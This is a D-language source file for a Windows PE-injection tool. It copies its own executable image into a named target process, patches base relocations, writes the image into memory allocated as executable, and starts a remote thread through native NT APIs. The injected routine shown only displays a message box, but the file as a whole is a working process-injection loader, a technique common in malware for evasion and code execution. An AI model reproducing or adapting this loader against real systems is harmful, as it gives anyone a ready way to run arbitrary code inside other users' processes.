import std.stdio;
import core.sys.windows.windows;
import std.bitmanip;
import std.conv;
import procenum, ntapi;

pragma(lib, "user32.lib");

extern(C) void* memcpy ( void* destination, const void* source, size_t num );

// https://dlang.org/phobos/std_bitmanip.html
struct BASE_RELOCATION_ENTRY
{
    mixin(bitfields!(
    	WORD, "Offset", 12,
    	WORD, "Type", 4,
    	uint, "", 0));
}

alias PBASE_RELOCATION_ENTRY = BASE_RELOCATION_ENTRY*;

void injectFn() {

    MessageBoxA(
        NULL,
        "Injected Pe!",
        "Injected",
        MB_OK | MB_ICONEXCLAMATION
    );

}

class PeHeaders {
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdrs;
    IMAGE_OPTIONAL_HEADER optHdr;
    IMAGE_FILE_HEADER fileHdr;

    this(PVOID imageBase) {

        this.dosHdr = cast(PIMAGE_DOS_HEADER)(imageBase);
        this.ntHdrs = cast(PIMAGE_NT_HEADERS)(imageBase + this.dosHdr.e_lfanew);
        this.optHdr = ntHdrs.OptionalHeader;
        this.fileHdr = ntHdrs.FileHeader;

    }
}

HANDLE openProcess(DWORD procId) {

    CLIENT_ID cId;
    cId.UniqueProcessId = cast(HANDLE)procId;
    cId.UniqueThreadId = cast(HANDLE)0;
    OBJECT_ATTRIBUTES objAttr;

    HANDLE targetProcess;

    NtOpenProcess(&targetProcess, PROCESS_ALL_ACCESS, &objAttr, &cId);

    return targetProcess;

}
void main(string[] args) {
    
    if (args.length <= 1) {
        writeln("[*] Usage: inject.exe <PROCESS_NAME>");
        return;
    }

    HANDLE targetProcess = openProcess(getProcessId(args[1]));
    NTSTATUS status;

    if (!targetProcess) {
        writeln("[-] Failed To Find Process.");
    }

    PVOID imageBase = GetModuleHandleA(NULL);

    auto imgHdrs = new PeHeaders(imageBase);

    auto dosHdr = imgHdrs.dosHdr;
    auto ntHdrs = imgHdrs.ntHdrs;
    auto optHdr = imgHdrs.optHdr;

    PVOID localImage;
    SIZE_T localImgSize = optHdr.SizeOfImage;

    status = NtAllocateVirtualMemory(GetCurrentProcess(), &localImage, 0, &localImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        PRINT_NTAPI_ERROR("NtAllocateVirtualMemory", status);
        return;
    }

    writefln("[+] Allocated Local Image At 0x%x", localImage);

    memcpy(localImage, imageBase, optHdr.SizeOfImage);

    PVOID targetImage;
    status = NtAllocateVirtualMemory(targetProcess, &targetImage, 0, &localImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(status)) {
        PRINT_NTAPI_ERROR("NtAllocateVirtualMemory", status);
        return;
    }

    writefln("[+] Allocated Remote Image At 0x%x", targetImage);

    DWORD_PTR deltaImageBase = cast(DWORD_PTR)targetImage - cast(DWORD_PTR)imageBase;

    PIMAGE_BASE_RELOCATION relocationTable = cast(PIMAGE_BASE_RELOCATION)(cast(DWORD_PTR)localImage + optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

    writeln("[+] Fixing Up Relocations");

    while (relocationTable.SizeOfBlock > 0)
	{
		relocationEntriesCount = cast(uint)(relocationTable.SizeOfBlock - IMAGE_BASE_RELOCATION.sizeof) / USHORT.sizeof;
		relocationRVA = cast(PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = cast(PDWORD_PTR)(cast(DWORD_PTR)localImage + relocationTable.VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaImageBase;
			}
		}
		relocationTable = cast(PIMAGE_BASE_RELOCATION)(cast(DWORD_PTR)relocationTable + relocationTable.SizeOfBlock);
	}

    status = NtWriteVirtualMemory(targetProcess, targetImage, localImage, optHdr.SizeOfImage, NULL);
    
    if (!NT_SUCCESS(status)) {
        PRINT_NTAPI_ERROR("NtWriteVirtualMemory", status);
        return;
    }

    writeln("[+] Wrote PE Buffer!");

    HANDLE createdThread;
    status = NtCreateThreadEx(&createdThread, THREAD_ALL_ACCESS, NULL, targetProcess, cast(PVOID)(cast(DWORD_PTR)(&injectFn) + deltaImageBase), NULL, 0, 0, 0, 0, NULL);

    if (!NT_SUCCESS(status)) {
        PRINT_NTAPI_ERROR("NtCreateThreadEx", status);
        return;
    }
    
    writefln("[+] Injection Successful!");
}